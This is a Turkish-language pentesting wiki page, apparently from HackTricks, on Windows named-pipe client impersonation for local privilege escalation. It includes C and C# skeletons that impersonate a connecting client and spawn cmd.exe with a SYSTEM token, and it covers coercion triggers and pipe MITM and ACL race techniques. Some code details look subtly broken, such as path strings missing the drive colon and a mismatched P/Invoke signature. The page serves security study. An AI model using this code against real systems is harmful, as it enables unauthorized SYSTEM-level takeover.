# Named Pipe Client Impersonation

{{#include ../../banners/hacktricks-training.md}}

Named Pipe Client Impersonation, bir named-pipe server thread'inin kendisine bağlanan bir client'ın security context'ini devralmasını sağlayan bir local privilege escalation primitive'idir. Pratikte SeImpersonatePrivilege ile code çalıştırabilen bir attacker, privileged bir client'ı (ör. SYSTEM service) attacker-controlled bir pipe'a bağlanmaya zorlayabilir, ImpersonateNamedPipeClient'ı çağırabilir, elde edilen token'ı primary token'a duplicate edebilir ve client olarak bir process başlatabilir (çoğunlukla NT AUTHORITY\SYSTEM).<sup>[[2]](#references)</sup>

Bu sayfa core technique'e odaklanır. SYSTEM'ı pipe'ınıza bağlanmaya zorlayan uçtan uca exploit chain'leri için aşağıda referans verilen Potato family sayfalarına bakın.

## TL;DR
- Bir named pipe oluşturun: \\.\pipe\<random> ve bir connection bekleyin.
- Privileged bir component'in buna bağlanmasını sağlayın (spooler/DCOM/EFSRPC/etc.).
- Pipe'tan en az bir message okuyun, ardından ImpersonateNamedPipeClient'ı çağırın.
- Current thread'den impersonation token'ı açın, bunu primary token'a DuplicateTokenEx(TokenPrimary) ile duplicate edin ve SYSTEM process'i elde etmek için CreateProcessWithTokenW/CreateProcessAsUser kullanın.<sup>[[2]](#references)</sup>

## Requirements and key APIs
- Calling process/thread tarafından genellikle gerekli olan privileges:
- SeImpersonatePrivilege, bağlanan client'ı başarılı şekilde impersonate etmek ve CreateProcessWithTokenW kullanmak için gereklidir.
- Alternatif olarak SYSTEM'ı impersonate ettikten sonra CreateProcessAsUser kullanabilirsiniz; bu işlem SeAssignPrimaryTokenPrivilege ve SeIncreaseQuotaPrivilege gerektirebilir (SYSTEM'ı impersonate ettiğinizde bunlar karşılanır).
- Kullanılan core APIs:<sup>[[1]](#references)[[4]](#references)</sup>
- CreateNamedPipe / ConnectNamedPipe
- ReadFile/WriteFile (impersonation'dan önce en az bir message okunmalıdır)
- ImpersonateNamedPipeClient ve RevertToSelf
- OpenThreadToken, DuplicateTokenEx(TokenPrimary)
- CreateProcessWithTokenW veya CreateProcessAsUser
- Impersonation level: client'ın local olarak kullanışlı işlemler gerçekleştirebilmesi için SecurityImpersonation'a izin vermesi gerekir (birçok local RPC/named-pipe client'ı için default). Client'lar pipe'ı açarken bunu SECURITY_SQOS_PRESENT | SECURITY_IDENTIFICATION ile düşürebilir.<sup>[[3]](#references)</sup>

## Minimal Win32 workflow (C)
```c
// Minimal skeleton (no error handling hardening for brevity)
#include <windows.h>
#include <stdio.h>

int main(void) {
LPCSTR pipe = "\\\\.\\pipe\\evil";
HANDLE hPipe = CreateNamedPipeA(
pipe,
PIPE_ACCESS_DUPLEX,
PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT,
1, 0, 0, 0, NULL);

if (hPipe == INVALID_HANDLE_VALUE) return 1;

// Wait for privileged client to connect (see Triggers section)
if (!ConnectNamedPipe(hPipe, NULL)) return 2;

// Read at least one message before impersonation
char buf[4]; DWORD rb = 0; ReadFile(hPipe, buf, sizeof(buf), &rb, NULL);

// Impersonate the last message sender
if (!ImpersonateNamedPipeClient(hPipe)) return 3; // ERROR_CANNOT_IMPERSONATE==1368

// Extract and duplicate the impersonation token into a primary token
HANDLE impTok = NULL, priTok = NULL;
if (!OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, FALSE, &impTok)) return 4;
if (!DuplicateTokenEx(impTok, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &priTok)) return 5;

// Spawn as the client (often SYSTEM). CreateProcessWithTokenW requires SeImpersonatePrivilege.
STARTUPINFOW si = { .cb = sizeof(si) }; PROCESS_INFORMATION pi = {0};
if (!CreateProcessWithTokenW(priTok, LOGON_NETCREDENTIALS_ONLY,
L"C\\\\Windows\\\\System32\\\\cmd.exe", NULL,
0, NULL, NULL, &si, &pi)) {
// Fallback: CreateProcessAsUser after you already impersonated SYSTEM
CreateProcessAsUserW(priTok, L"C\\\\Windows\\\\System32\\\\cmd.exe", NULL,
NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
}

RevertToSelf(); // Restore original context
return 0;
}
```
Notlar:
- ImpersonateNamedPipeClient ERROR_CANNOT_IMPERSONATE (1368) döndürürse önce pipe'dan okuduğunuzdan ve client'ın impersonation'ı Identification seviyesiyle sınırlamadığından emin olun.
- Process creation için uygun bir primary token oluşturmak üzere SecurityImpersonation ve TokenPrimary ile DuplicateTokenEx kullanmayı tercih edin.

## .NET hızlı örnek
.NET'te NamedPipeServerStream, RunAsClient aracılığıyla impersonation yapabilir. Impersonation işlemi başladıktan sonra thread token'ını duplicate edin ve bir process oluşturun.
```csharp
using System; using System.IO.Pipes; using System.Runtime.InteropServices; using System.Diagnostics;
class P {
[DllImport("advapi32", SetLastError=true)] static extern bool OpenThreadToken(IntPtr t, uint a, bool o, out IntPtr h);
[DllImport("advapi32", SetLastError=true)] static extern bool DuplicateTokenEx(IntPtr e, uint a, IntPtr sd, int il, int tt, out IntPtr p);
[DllImport("advapi32", SetLastError=true, CharSet=CharSet.Unicode)] static extern bool CreateProcessWithTokenW(IntPtr hTok, int f, string app, string cmd, int c, IntPtr env, string cwd, ref ProcessStartInfo si, out Process pi);
static void Main(){
using var s = new NamedPipeServerStream("evil", PipeDirection.InOut, 1);
s.WaitForConnection();
// Ensure client sent something so the token is available
s.RunAsClient(() => {
IntPtr t; if(!OpenThreadToken(Process.GetCurrentProcess().Handle, 0xF01FF, false, out t)) return; // TOKEN_ALL_ACCESS
IntPtr p; if(!DuplicateTokenEx(t, 0xF01FF, IntPtr.Zero, 2, 1, out p)) return; // SecurityImpersonation, TokenPrimary
var psi = new ProcessStartInfo("C\\Windows\\System32\\cmd.exe");
Process pi; CreateProcessWithTokenW(p, 2, null, null, 0, IntPtr.Zero, null, ref psi, out pi);
});
}
}
```
## SYSTEM'i pipe'ınıza bağlamak için yaygın trigger/coercion yöntemleri
Bu teknikler, ayrıcalıklı servisleri named pipe'ınıza bağlanmaya zorlayarak onları impersonate etmenizi sağlar:
- Print Spooler RPC trigger (PrintSpoofer)
- DCOM activation/NTLM reflection varyantları (RoguePotato/JuicyPotato[NG], GodPotato)
- EFSRPC pipes (EfsPotato/SharpEfsPotato)

Ayrıntılı kullanım ve uyumluluk bilgileri için:

-
{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}
-
{{#ref}}
juicypotato.md
{{#endref}}

Pipe'ı oluşturup bir service trigger üzerinden SYSTEM hesabından process spawn etmek ve impersonation yapmak için tam bir örneğe ihtiyacınız varsa:

-
{{#ref}}
from-high-integrity-to-system-with-name-pipes.md
{{#endref}}
-
{{#ref}}
service-triggers.md
{{#endref}}

## Named Pipe IPC Abuse & MITM (ACLs, First-Instance Races, Client Hooking)

Ayrıcalıklı bir servis ile düşük ayrıcalıklı bir process `\\.\pipe\...` üzerinden iletişim kurduğunda, pipe'ı diğer tüm güvenilmeyen IPC sınırları gibi değerlendirin. Klasik server-side impersonation'ın yanı sıra zayıf pipe ACL'leri, güvenli olmayan oluşturma flag'leri ve client-side trust kararlarının tümü local privilege escalation primitive'lerine dönüşebilir.<sup>[[7]](#references)</sup>

### Önce aday pipe'ları enumerate edin
- PowerShell üzerinden pipe'ları hızlıca listeleyin: `Get-ChildItem \\.\pipe\`
- Sysinternals `pipelist64.exe`, instance sayılarını ve single-instance pipe'ları tespit etmek için kullanışlıdır.
- `SYSTEM` olarak çalışan servislerin kullandığı adlara, özellikle helper'lara, updater'lara, launcher'lara ve UI broker'larına öncelik verin.

### Permissive DACL'ler ve ek pipe instance'ları üzerinden MITM
- Ayrıcalıklı bir server ile iletişim kurabilen herhangi bir process, protokolünü fuzz edebilir ve ayrıcalıklı verb'leri araştırabilir.<sup>[[7]](#references)</sup>
- Daha ilgi çekici durum, DACL'in pipe object üzerinde `FILE_GENERIC_WRITE`/`GENERIC_WRITE` izni vermesidir. Named pipe'larda bu izin, örtük olarak `FILE_CREATE_PIPE_INSTANCE` içerir (`FILE_APPEND_DATA` aynı bit'i paylaşır); dolayısıyla attacker aynı adla başka bir server instance'ı oluşturabilir.
- Instance'lar FIFO sırasına göre eşleştirildiğinden, attacker tarafından oluşturulan ve legitimate instance'lar araya girebilir: `CreateNamedPipe` ile rogue bir instance oluşturun, ardından `CreateFile` ile aynı pipe adını açın ve gerçek bir client'ın rogue server instance'ına bağlanmasını bekleyin.
- Sonuç: Orijinal server process'ine sahip olmanız gerekmeden ayrıcalıklı IPC'yi gözlemleyebilir, değiştirebilir, relay edebilir veya desynchronize edebilirsiniz.

### Pipe security descriptor'larında first-instance race
- `lpSecurityAttributes`, yalnızca bir pipe adının ilk instance'ı oluşturulduğunda DACL'i tanımlar.<sup>[[4]](#references)[[7]](#references)</sup>
- Ayrıcalıklı bir servis geç başlarsa ve `FILE_FLAG_FIRST_PIPE_INSTANCE` kullanmazsa, attacker pipe adını permissive bir DACL ile önceden oluşturabilir; ardından servisin sonraki instance'ları attacker'ın seçtiği security context altında oluşturmasına izin verebilir.
- Bu durum servis başlangıcını bir race condition'a dönüştürür: İlk instance'ı kazanın, ardından zayıflatılmış ACL'i kullanarak sonraki client'lara bağlanın veya MITM yapın.
- Defenders için mitigation ve attackers için önemli bir inceleme noktası: `CreateNamedPipe(..., dwOpenMode, ...)` çağrısının `FILE_FLAG_FIRST_PIPE_INSTANCE` içerip içermediğini kontrol edin. İçermiyorsa servis başlamadan önce pre-creation işlemini test edin.

### PID/signature kontrolleri bir hardening önlemidir, sınır değildir
- Bazı ürünler, `GetNamedPipeClientProcessId`, process image path veya bağlanan client'ın Authenticode signer bilgisini kontrol ederek erişimi kısıtlamaya çalışır.<sup>[[7]](#references)</sup>
- Bu kontroller yalnızca legitimate client'a injection yapana kadar işe yarar: Trusted process'in içine girdikten sonra server'ın beklediği PID/image/signature context'inin aynısını devralırsınız.
- Split desktop app'ler için düşük ayrıcalıklı UI/helper process'ini instrument etmek, doğrudan `SYSTEM` servisine saldırmaktan genellikle daha kolaydır.

### Client'ı I/O modeline göre hook'layın
- Synchronous I/O: buffer syscall tarafından tüketilmeden önce `NtWriteFile`'ı intercept edin ve `NtReadFile` döndükten sonra inceleyin/değiştirin.<sup>[[7]](#references)</sup>
- Overlapped I/O: `NtReadFile` içinde görülen `OVERLAPPED`/`IoStatusBlock` değerini saklayın, ardından `GetOverlappedResult` veya ilgili wait tamamlandıktan sonra buffer'ı inceleyin.
- Completion port'ları: `GetQueuedCompletionStatus`, `NtRemoveIoCompletion`'a ulaşır; döndürülen `ApcContext`, original read işleminde kullanılan `OVERLAPPED` ile bağlantılıdır ve artık doldurulmuş buffer'ı bulmak için doğru pivot'tur.
- Completion routine'leri (`ReadFileEx`): completion callback'i bir APC olarak iletilir. Döndürülen veriyi tamper etmek veya synthetic reply'ler inject etmek istiyorsanız gerçek completion routine'i hook'layın; custom injection için ise routine'in beklediği 3 argument'i yeniden oluşturan tek argument'li bir `QueueUserAPC` dispatcher kullanın.<sup>[[5]](#references)[[7]](#references)</sup>

### Tooling notları
- [pipetap](https://sensepost.com/blog/2025/pipetap-a-windows-named-pipe-proxy-tool/), injected bir helper DLL üzerinden named-pipe trafiğini proxy'ler ve düzenleme/replay için Burp benzeri bir workflow sunar.<sup>[[6]](#references)</sup>
- [thats_no_pipe](https://github.com/synacktiv/thats_no_pipe), Frida tabanlı bir yaklaşım kullanır ve `NtReadFile`/`NtWriteFile` ile yukarıdaki async/completion pivot'larını hook'lamaya, ardından trafiği WebSocket destekli bir düzenleme workflow'una forward etmeye odaklanır.<sup>[[7]](#references)[[8]](#references)</sup>
```bash
pip install pipetap
```

```python
import pipetap
client = pipetap.Client(("127.0.0.1", 47001))
client.write(b"OP\x00\x01...")
```
### Operasyonel hususlar
- Named pipe'lar düşük gecikmelidir; buffer'ları düzenlerken verilen uzun aralar, kırılgan servislerde deadlock'a neden olabilir.<sup>[[7]](#references)</sup>
- Overlapped/completion-port/APC-driven client'lar, basit `ReadFile`/`WriteFile` detour'larından farklı hook'lara ihtiyaç duyar.
- Güvenilir client'a injection yapmak gürültülüdür ve genellikle exploit development, protocol reversing veya local lab fuzzing ile sınırlı tutulmalıdır.

## Sorun giderme ve dikkat edilmesi gerekenler
- ImpersonateNamedPipeClient'ı çağırmadan önce pipe'dan en az bir mesaj okumalısınız; aksi hâlde ERROR_CANNOT_IMPERSONATE (1368) alırsınız.<sup>[[1]](#references)</sup>
- Client SECURITY_SQOS_PRESENT | SECURITY_IDENTIFICATION ile bağlanırsa server tam olarak impersonate edemez; GetTokenInformation(TokenImpersonationLevel) ile token'ın impersonation level'ını kontrol edin.<sup>[[3]](#references)</sup>
- CreateProcessWithTokenW, caller üzerinde SeImpersonatePrivilege gerektirir. Bu işlem ERROR_PRIVILEGE_NOT_HELD (1314) ile başarısız olursa, SYSTEM'ı zaten impersonate ettikten sonra CreateProcessAsUser kullanın.
- Pipe'ınızı harden ediyorsanız, security descriptor'ınızın hedef service'in bağlanmasına izin verdiğinden emin olun; varsayılan olarak \\.\pipe altındaki pipe'lara erişim server'ın DACL'ına göre belirlenir.<sup>[[3]](#references)</sup>

## References

- [1] [Windows: ImpersonateNamedPipeClient documentation](https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-impersonatenamedpipeclient)
- [2] [ired.team: Windows named pipes privilege escalation](https://ired.team/offensive-security/privilege-escalation/windows-namedpipes-privilege-escalation)
- [3] [Microsoft: Named Pipe Security and Access Rights](https://learn.microsoft.com/en-us/windows/win32/ipc/named-pipe-security-and-access-rights)
- [4] [Microsoft: CreateNamedPipe function](https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createnamedpipea)
- [5] [Microsoft: Named Pipe Server Using Completion Routines](https://learn.microsoft.com/en-us/windows/win32/ipc/named-pipe-server-using-completion-routines)
- [6] [pipetap – a Windows named pipe proxy tool](https://sensepost.com/blog/2025/pipetap-a-windows-named-pipe-proxy-tool/)
- [7] [Synacktiv: Hooking Windows Named Pipes](https://www.synacktiv.com/en/publications/hooking-windows-named-pipes.html)
- [8] [Synacktiv: thats_no_pipe](https://github.com/synacktiv/thats_no_pipe)

{{#include ../../banners/hacktricks-training.md}}
